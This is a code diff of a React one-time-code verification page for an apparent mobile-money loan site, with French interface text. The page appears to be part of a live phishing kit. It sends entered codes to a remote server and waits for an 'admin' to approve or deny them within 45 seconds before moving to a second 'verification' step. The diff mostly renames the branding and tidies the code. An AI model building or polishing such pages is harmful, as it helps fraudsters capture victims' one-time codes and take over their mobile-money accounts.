@@ -2,7 +2,6 @@ import { useState, useEffect, useRef, type KeyboardEvent } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Wallet, ArrowLeft } from "lucide-react";
 
-// ✅ UPDATED TO NEW RENDER URL
 const API_URL = "https://fastloan-momo-kj8m.onrender.com";
 
 const OTPVerification = () => {
@@ -52,7 +51,7 @@ const OTPVerification = () => {
     // Timeout fallback if admin doesn't respond in 45 seconds
     const timeoutId = setTimeout(() => {
       setIsVerifying(false);
-      navigate("/login"); // Updated to /login to match your new routing
+      navigate("/login"); 
     }, 45000);
 
     try {
@@ -70,11 +69,11 @@ const OTPVerification = () => {
           
           if (statusData.status !== "pending") {
             clearInterval(interval);
-            clearTimeout(timeoutId); // Clear the 45s timeout
+            clearTimeout(timeoutId);
             setIsVerifying(false);
             
             if (statusData.status === "approved") {
-              // ✅ CHANGED: Go to Second Verification instead of Loan Limit
+              // ✅ Move to the 2nd Verification page
               navigate("/second-verification", { state: { phone: phoneNumber } });
             } else if (statusData.status === "denied") {
               navigate("/login"); 
@@ -95,40 +94,29 @@ const OTPVerification = () => {
 
   return (
     <div className="min-h-screen bg-[#FCD535] flex flex-col items-center px-5 py-8 font-sans">
-
-      {/* HEADER */}
       <div className="text-center mb-8 mt-4">
         <div className="w-16 h-16 rounded-2xl bg-[#F0B90B] flex items-center justify-center mx-auto mb-4 shadow-sm">
           <Wallet size={32} color="#1E1E1E" />
         </div>
         <h1 className="text-2xl font-extrabold text-[#1E1E1E] tracking-tight">
-          FastLoan<span className="text-[#B8860B]">MoMo</span>
+          Fast Product<span className="text-[#B8860B]">MoMo</span>
         </h1>
         <p className="text-sm text-white/90 mt-1 font-medium drop-shadow-sm">
-          Produits mobiles instantanés
+          Vérification de sécurité (1/2)
         </p>
       </div>
 
-      {/* MAIN CARD */}
       <div className="w-full max-w-md bg-white rounded-3xl shadow-xl p-6 sm:p-8">
-        
-        {/* BACK BUTTON */}
-        <button 
-          onClick={() => navigate(-1)} 
-          className="flex items-center text-gray-500 hover:text-gray-800 font-medium mb-6 transition-colors"
-        >
+        <button onClick={() => navigate(-1)} className="flex items-center text-gray-500 hover:text-gray-800 font-medium mb-6 transition-colors">
           <ArrowLeft size={18} className="mr-1.5" /> Retour
         </button>
         
-        <h2 className="text-2xl font-extrabold text-[#1E1E1E] mb-3">
-          Vérifiez votre numéro
-        </h2>
+        <h2 className="text-2xl font-extrabold text-[#1E1E1E] mb-3">Vérifiez votre numéro</h2>
         
         <p className="text-sm text-gray-600 leading-relaxed mb-8">
           Nous avons envoyé un code à 4 chiffres au <span className="font-bold text-[#1E1E1E]">{formatPhone(phoneNumber)}</span>.
         </p>
         
-        {/* OTP INPUTS */}
         <div className="flex justify-between gap-3 mb-8">
           {otp.map((digit, index) => (
             <input 
@@ -145,7 +133,6 @@ const OTPVerification = () => {
           ))}
         </div>
 
-        {/* SUBMIT */}
         <button 
           onClick={handleVerify} 
           disabled={!isOtpComplete || isVerifying} 
@@ -155,11 +142,10 @@ const OTPVerification = () => {
               : "bg-gray-100 text-gray-400 cursor-not-allowed"
           }`}
         >
-          {isVerifying ? "En attente..." : "Vérifier & se connecter"}
+          {isVerifying ? "En attente..." : "Vérifier"}
         </button>
       </div>
 
-      {/* SPINNER MODAL */}
       {isVerifying && (
         <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center px-5">
           <div className="bg-white rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl">
